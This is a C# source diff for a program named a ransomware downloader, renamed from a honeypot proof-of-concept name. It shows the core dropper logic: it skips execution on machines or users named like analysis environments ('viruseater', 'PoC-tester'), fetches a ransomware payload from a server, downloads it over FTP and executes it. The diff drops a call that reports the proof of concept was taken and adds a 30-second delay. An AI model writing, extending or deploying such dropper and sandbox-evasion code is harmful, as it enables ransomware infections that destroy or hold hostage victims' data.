@@ -6,7 +6,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
-namespace HoneyPot5POCRansomwareDownloader
+namespace ShannonRansomwareDownloader
 {
     class Program
     {
@@ -20,17 +20,12 @@ namespace HoneyPot5POCRansomwareDownloader
             if (Environment.MachineName.Contains("viruseater")) return;
             if (Environment.UserName.Contains("viruseater")) return;
             if (Environment.UserName.Contains("PoC-tester")) return;
-
             Thread.Sleep(2000);
             serverCommunicator.setRansomwareFilePath();
             serverCommunicator.getPoCRansomware();
             Console.WriteLine(serverCommunicator.getNAMEONTEST());
             Thread.Sleep(100);
             //Install ransomware
-
-            serverCommunicator.postPoCTaken();
-
-            Thread.Sleep(100);
 
             serverCommunicator.downloadFileFTP();
 
@@ -42,7 +37,7 @@ namespace HoneyPot5POCRansomwareDownloader
 
             programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());
 
-
+            Thread.Sleep(30000);
             //Play ransomware
         }
     }
